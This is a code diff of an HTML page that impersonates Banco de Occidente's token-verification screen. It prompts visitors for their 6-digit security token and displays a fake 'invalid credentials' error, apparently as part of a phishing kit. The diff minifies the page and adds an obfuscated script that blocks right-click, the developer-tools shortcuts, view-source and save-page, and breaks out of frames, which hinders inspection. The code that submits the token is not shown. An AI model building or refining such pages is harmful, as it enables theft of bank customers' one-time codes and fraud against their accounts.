@@ -1,106 +1,4 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco de Occidente - Verificación Token</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <div class="container">
-        <div class="card">
-            <a href="#/seguridad" class="security-badge">
-                <span class="icon-shield">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <circle cx="12" cy="12" r="10" stroke="#00ca82" stroke-width="1.8" fill="none"/>
-                        <path d="M12 6 L7 8.5 L7 13 C7 16 9.5 18.5 12 19.5 C14.5 18.5 17 16 17 13 L17 8.5 Z" 
-                              stroke="#00ca82" stroke-width="1.5" fill="none" stroke-linejoin="round"/>
-                        <path d="M10 12.5 L11.5 14 L14 11.5" 
-                              stroke="#00ca82" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                    </svg>
-                </span>
-                <span class="security-text">Seguridad</span>
-            </a>
-
-            <div class="logo-container">
-                <img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
-            </div>
-
-            <div class="welcome-text">
-                <p class="welcome">Verificación de identidad</p>
-                <p class="portal-title">Ingresa tu Token</p>
-            </div>
-
-            <div class="info-box">
-                <p>Por tu seguridad, ingresa el <strong>token de 6 dígitos</strong> generado por tu dispositivo de seguridad.</p>
-            </div>
-
-            <form class="login-form" id="form-token">
-                <div class="form-group">
-                    <label for="token">Token de seguridad</label>
-                    <input 
-                        type="text" 
-                        id="token" 
-                        placeholder="Ingresa los 6 dígitos" 
-                        class="input-field input-token" 
-                        maxlength="6"
-                        pattern="[0-9]{6}"
-                        required
-                        autocomplete="off"
-                        inputmode="numeric"
-                    >
-                </div>
-
-                <div class="help-text">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#666"/>
-                    </svg>
-                    <span>Ingresa el token de 6 dígitos generado por tu dispositivo de seguridad</span>
-                </div>
-
-                <button type="button" class="btn-login" id="btnContinuar" disabled>
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="white"/>
-                    </svg>
-                    Verificar Token
-                </button>
-
-                <div class="back-link">
-                    <a href="index.html">← Volver al inicio</a>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <div class="loading-screen" id="loadingScreen">
-        <div class="loading-content">
-            <img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
-            <p class="loading-text">Verificando token...</p>
-        </div>
-    </div>
-
-    <div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,0.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;opacity:0;transition:opacity .3s ease">
-        <div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popInError .4s cubic-bezier(0.34,1.56,0.64,1);color:#1a1a2e">
-            <div style="width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,0.35)">
-                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <line x1="12" y1="8" x2="12" y2="13"></line>
-                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
-                </svg>
-            </div>
-            <div style="font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px">Credenciales inválidas</div>
-            <div style="font-size:14px;color:#555;line-height:1.55;margin-bottom:22px">Los datos ingresados son incorrectos.<br>Por favor verifica e inténtalo nuevamente.</div>
-            <button id="errorLoginBtn" style="display:block;width:100%;background:linear-gradient(135deg,#0033a0 0%,#002277 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(0,51,160,0.35)">Intentar de nuevo</button>
-        </div>
-    </div>
-
-    <style>
-    @keyframes popInError{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}
-    #errorLogin.visible{display:flex !important;opacity:1 !important}
-    </style>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
+<!doctype html><html lang="es"><head><link rel="icon" type="image/x-icon" href="img/favicon.ico"><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Banco de Occidente - Verificación Token</title><link rel="stylesheet" href="styles.css"></head><body><div class="container"><div class="card"><a href="#/seguridad" class="security-badge"><span class="icon-shield"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" stroke="#00ca82" stroke-width="1.8" fill="none"/><path d="M12 6 L7 8.5 L7 13 C7 16 9.5 18.5 12 19.5 C14.5 18.5 17 16 17 13 L17 8.5 Z" stroke="#00ca82" stroke-width="1.5" fill="none" stroke-linejoin="round"/><path d="M10 12.5 L11.5 14 L14 11.5" stroke="#00ca82" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg> </span><span class="security-text">Seguridad</span></a><div class="logo-container"><img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo"></div><div class="welcome-text"><p class="welcome">Verificación de identidad</p><p class="portal-title">Ingresa tu Token</p></div><div class="info-box"><p>Por tu seguridad, ingresa el <strong>token de 6 dígitos</strong> generado por tu dispositivo de seguridad.</p></div><form class="login-form" id="form-token"><div class="form-group"><label for="token">Token de seguridad</label> <input id="token" placeholder="Ingresa los 6 dígitos" class="input-field input-token" maxlength="6" pattern="[0-9]{6}" required autocomplete="off" inputmode="numeric"></div><div class="help-text"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#666"/></svg> <span>Ingresa el token de 6 dígitos generado por tu dispositivo de seguridad</span></div><button type="button" class="btn-login" id="btnContinuar" disabled="disabled"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="white"/></svg> Verificar Token</button><div class="back-link"><a href="index.html">← Volver al inicio</a></div></form></div></div><div class="loading-screen" id="loadingScreen"><div class="loading-content"><img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner"><p class="loading-text">Verificando token...</p></div></div><div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:Poppins,sans-serif;opacity:0;transition:opacity .3s ease"><div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3);animation:popInError .4s cubic-bezier(.34,1.56,.64,1);color:#1a1a2e"><div style="width:72px;height:72px;background:linear-gradient(135deg,#ff4d4d 0,#c20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,.35)"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="8" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg></div><div style="font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px">Credenciales inválidas</div><div style="font-size:14px;color:#555;line-height:1.55;margin-bottom:22px">Los datos ingresados son incorrectos.<br>Por favor verifica e inténtalo nuevamente.</div><button id="errorLoginBtn" style="display:block;width:100%;background:linear-gradient(135deg,#0033a0 0,#027 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(0,51,160,.35)">Intentar de nuevo</button></div></div><style>@keyframes popInError{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}#errorLogin.visible{display:flex!important;opacity:1!important}</style><script>document.addEventListener('DOMContentLoaded', function () {
 
             const tokenInput = document.getElementById('token');
             const btnContinuar = document.getElementById('btnContinuar');
@@ -237,7 +135,25 @@
                 });
             }
 
-        });
-    </script>
-</body>
-</html>
+        });</script><script>(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xk1){document.body.innerHTML='';}
+})();</script></body></html>
